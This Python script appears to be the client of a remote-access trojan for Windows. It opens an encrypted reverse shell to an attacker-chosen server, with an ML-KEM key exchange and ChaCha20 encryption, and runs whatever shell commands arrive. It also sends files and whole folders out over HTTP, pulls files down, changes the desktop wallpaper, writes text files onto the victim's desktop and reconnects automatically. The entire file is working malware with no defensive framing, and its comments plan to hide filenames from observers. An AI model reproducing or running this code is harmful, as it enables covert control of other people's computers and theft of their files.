#!/usr/bin/env python3

import argparse
import ctypes
import os
import socket
import subprocess
import tarfile
import sys
import time

import requests
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from kyber_py.ml_kem import ML_KEM_1024
from zstandard import ZstdCompressor, ZstdDecompressor
from dotenv import load_dotenv

if hasattr(sys, '_MEIPASS'):
    dotenv_path = os.path.join(sys._MEIPASS, '.env')
    load_dotenv(dotenv_path)
else:
    load_dotenv()

server = os.getenv("SERVER")

def chacha20_encrypt(data, key, nonce):
    cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(data)

def chacha20_decrypt(data, key, nonce):
    cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(data)

def set_wallpaper(path):
    SPI_SETDESKWALLPAPER = 20
    SPIF_UPDATEINIFILE = 0x1
    SPIF_SENDCHANGE = 0x2
    result = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)
    if not result:
        raise Exception("Error setting wallpaper")

def reverse_shell(server_ip, server_port):
    mlkem = ML_KEM_1024
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client.connect((server_ip, server_port))
    except socket.timeout:
        time.sleep(5)
        reverse_shell(server_ip, server_port)
        return

    try:
        server_public_key = client.recv(4096)

        shared_key, ciphertext = mlkem.encaps(server_public_key)
        client.sendall(ciphertext)

        derived_key = HKDF(
            algorithm=hashes.SHA256(),
            length=48,
            salt=None,
            info=b'handshake data',
            backend=default_backend()
        ).derive(shared_key)

        key = derived_key[:32]
        nonce = derived_key[32:48]

        while True:
            folder = 'False'
            encrypted_command = client.recv(4096)
            if not encrypted_command:
                break
            command = chacha20_decrypt(encrypted_command, key, nonce)
            command = ZstdDecompressor().decompress(command).decode('utf-8')

            if command.lower() == "exit":
                client.close()
                break
            elif command.lower().startswith("-download "):
                filename = command.split(" ", 1)[1]
                if os.path.isdir(filename):
                    folder = 'True'
                    tar_filename = filename + ".tar"
                    with tarfile.open(tar_filename, "w") as tar:
                        tar.add(filename, arcname=os.path.basename(filename))
                    with open(tar_filename, "rb") as f:
                        file_content = f.read()
                    os.remove(tar_filename)
                    compressed_file_data = ZstdCompressor().compress(file_content)
                else:
                    with open(filename, 'rb') as f:
                        file_data = f.read()
                    compressed_file_data = ZstdCompressor().compress(file_data)
                filename = os.path.basename(filename) + '.zst'
                encrypted_file_data = chacha20_encrypt(compressed_file_data, key, nonce)
                requests.post('http://' + server_ip + ':' + str (server_port + 1) + '/d', data=encrypted_file_data, headers={'Filename': filename, 'Folder': folder}) #TODO: Hide filename.
                output = None
            elif command.lower().startswith("-upload "):
                filename = command.split(" ", 1)[1] 
                response = requests.post('http://' + server_ip + ':' + str (server_port + 1) + '/u', headers={'Filename': filename}) #TODO: Hide filename headers.
                desencrypted_content = chacha20_decrypt(response.content, key, nonce)
                decompressed_content = ZstdDecompressor().decompress(desencrypted_content)
                file_destination = os.path.basename(filename)
                with open(file_destination, 'wb') as f:
                    f.write(decompressed_content)
                output = None
            elif command.lower().startswith("-wallpaper "):
                filename = command.split(" ", 1)[1]
                response = requests.post('http://' + server_ip + ':' + str(server_port + 1) + '/u', headers={'Filename': filename})
                desencrypted_content = chacha20_decrypt(response.content, key, nonce)
                decompressed_content = ZstdDecompressor().decompress(desencrypted_content)
                wallpaper_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Themes", "CachedFiles")
                if not os.path.exists(wallpaper_folder):
                    os.makedirs(wallpaper_folder)
                file_destination = os.path.join(wallpaper_folder, os.path.basename(filename))
                with open(file_destination, 'wb') as f:
                    f.write(decompressed_content)
                set_wallpaper(file_destination)
                output = None
            elif command.lower().startswith("-txt "):
                filename = command.split(" ", 1)[1].split("///")[0]
                message = command.split(" ", 1)[1].split("///")[1]
                desktop_folder = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')

                file_destination = os.path.join(desktop_folder, os.path.basename(filename))
                with open(file_destination, 'wb') as f:
                    f.write(message.encode('utf-8'))
                output = None
            else:
                output = subprocess.getoutput(command)

            if output == "" or output is None:
                output = "No output"

            output = ZstdCompressor().compress(output.encode('utf-8'))
            encrypted_output = chacha20_encrypt(output, key, nonce)
            client.sendall(encrypted_output)

    except Exception:
        output = "Error: Connection lost or command failed"
        output = ZstdCompressor().compress(output.encode('utf-8'))
        encrypted_output = chacha20_encrypt(output, key, nonce)
        client.sendall(encrypted_output)
        client.close()
        time.sleep(5)
        reverse_shell(server_ip, server_port)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    if server is None:
        parser.add_argument("-s", "--server", required=True, help="Server hostname or IP address")

    parser.add_argument("-p", "--port", type=int, default=5050, help="Server port (default: 5050)")
    args = parser.parse_args()

    if server is not None:
        args.server = server

    try:
        ip = socket.gethostbyname(args.server)
    except Exception:
        ip = args.server
    finally:
        reverse_shell(ip, args.port)